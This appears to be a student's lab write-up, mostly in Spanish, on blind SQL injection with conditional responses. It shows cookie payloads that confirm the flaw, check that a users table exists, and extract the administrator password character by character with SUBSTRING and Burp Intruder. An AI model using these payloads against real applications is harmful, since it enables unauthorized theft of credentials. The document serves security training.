
# Blind SQL injection with conditional responses

Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the 
results of the relevant SQL query or the details of any database errors.
With blind SQL injection vulnerabilities, many techniques such as UNION attacks,
are not effective because they rely on being able to see the results of the injected query within the application's responses.
It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

## Paso 1

Identificar que en la cookie existe una inyeccion SQL.

En este ejemplo tenemos una cookie "TrackId" primero se prueba si es vulerable 

```
Cookie: TrackingId=HjnfhA06d5ESS3fR'and 1=1--; session=BTTP2qL1z1a4sJNyePUM0DOuWo4UsYyu
Cookie: TrackingId=HjnfhA06d5ESS3fR'and 1=2--; session=BTTP2qL1z1a4sJNyePUM0DOuWo4UsYyu
```

Si regresa el mensaje de "Welcome back" eso quiere decir que esta interpretanod nuestro codigo. Probar con 1=2 para que de false porque una se evelua con true
y la otra con false.

## Paso 2

(falta saber como se supo que tenidamos estas tablas y usuarios)

El siguiente paso es probar si la tabla users existe eso se hace con una consulta la cual pone una x(o cualquier caracter) 
en cada fila por cada registro que exista dentro de la base:

```
Cookie: TrackingId=UHO0YeDpDdzu3u9A' and (select 'x' from users limit 1)='x'-- // recuerda el ctrl + U

```

Si nos da el mensaje de "Welcome back" quiere decir que es true y que esta tabla users existe. 
***Select 'x'...*** es una sentencia que pone una x por cada fila que tenga la tabla en este caso se limita a 1
y como se iguala a x si exite seria x=x lo que regresa true 

## Paso 3 

Ir sacando datos evaluando con true or false


```
'and (select 'a' from users where username='administrator')='a'--

'and (select username from users where username='administrator')='administrator'--


```

Primero se checho si existe el usuario "administrator (que si existe porque devolvio true por tanto el mensaje de welcome bacK)
Se hizo con diferentes metodos todos probados y funcionaron por eso hay 2 sentencias de unos
a


## Paso 4

Sacar el password. Primero se saca el len del password para posteriormente irlo sacando
Se utilizo el ***Intruder*** dar clear y poner add en la payload poner snipper 
y revisar cuando las peticiones son diferentes.


```
'and (select username from users where username='administrator' and length(password)>19)='a'--

'and (select 'a' from users where username='administrator' and length(password)>19)='a'--

```

Dio 20 aunque la consulta de 

```

'and (select 'a' from users where username='administrator' and length(password)>20)='a'--
 
```


Para el segundo query caracter ya da false porque el numero es 20 no mayor a 20 


## Paso 5

***Substring sintaxis***

```
SUBSTRING(EXPRESION(COLUMNA),POSICION(EMPIEZA EN 1),LENGTH).

```

Se utiliza substring para sacar los datos las posiciones empienzan index 1.


```
'and (select substring(password,1,1) from users where username='administrator')='a'--
```

Se puede usar el ataque cluster Bomb pero solo en Burp Pro 
iteraria sobre los cambpos (select substring(password,*,1) y where username='administrator')='*'


```
'and (select substring(password,2,1) from users where username='administrator')='a'--

'and (select substring(password,2,1) from users where username='administrator')='$a$'--
```


Asi uno por uno iria iterando para sacar el password.



